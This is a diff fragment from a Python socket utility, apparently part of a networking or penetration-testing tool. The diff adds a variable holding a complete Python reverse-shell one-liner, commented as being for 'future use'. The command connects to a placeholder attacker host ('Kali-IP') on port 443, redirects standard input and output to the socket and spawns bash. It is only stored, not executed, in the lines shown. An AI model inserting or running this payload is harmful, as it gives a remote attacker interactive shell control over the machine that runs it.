@@ -27,6 +27,8 @@ import time
 # we gather the starting location to use when we search for a file later
 start_loc = os.getcwd()
 
+# future use, this will allow for a shell call back from a remote system.
+command = 'python3 -c \'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("Kali-IP",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")\''
 
 def mysendall(socket, data, delimiter):
     """
